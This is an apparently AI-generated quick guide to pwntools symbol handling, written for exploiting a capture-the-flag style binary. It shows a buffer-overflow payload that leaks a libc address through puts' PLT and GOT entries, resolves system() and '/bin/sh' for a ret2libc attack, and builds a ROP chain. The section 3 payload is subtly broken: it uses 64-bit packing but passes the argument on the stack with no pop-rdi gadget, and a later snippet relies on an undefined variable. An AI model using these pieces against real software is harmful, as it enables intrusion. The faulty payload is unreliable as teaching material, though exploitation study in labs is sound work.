Here is a **clean, minimal Markdown guide** with concise pwntools `symbols` examples.

---

# Pwntools Symbols Quick Guide

## 1. Load ELF and Access Symbols

```python
from pwn import *

elf = ELF("./vuln")

print(hex(elf.symbols["main"]))   # address of main()
print(hex(elf.symbols["win"]))    # address of win()
```

---

## 2. PLT and GOT Addresses

```python
elf = ELF("./vuln")

puts_plt = elf.plt["puts"]
puts_got = elf.got["puts"]

print(hex(puts_plt))
print(hex(puts_got))
```

---

## 3. Leak a libc Address Using PLT + GOT

```python
elf = ELF("./vuln")

payload  = b"A" * 40
payload += p64(elf.plt["puts"])          # call puts()
payload += p64(elf.symbols["main"])      # return to main
payload += p64(elf.got["puts"])          # argument: GOT entry

print(payload)
```

---

## 4. Compute libc Base and Resolve Functions

```python
libc = ELF("./libc.so.6")

libc_base = leaked_puts - libc.symbols["puts"]
system_addr = libc_base + libc.symbols["system"]
binsh_addr  = libc_base + next(libc.search(b"/bin/sh\x00"))
```

---

## 5. Search for Symbols by Name

```python
elf = ELF("./vuln")

for name, addr in elf.symbols.items():
    if "secret" in name:
        print(name, hex(addr))
```

---

## 6. Build a ROP Chain Using Symbols

```python
elf = ELF("./vuln")
rop = ROP(elf)

rop.call("win")         # uses elf.symbols["win"]
print(rop.chain())
```

---
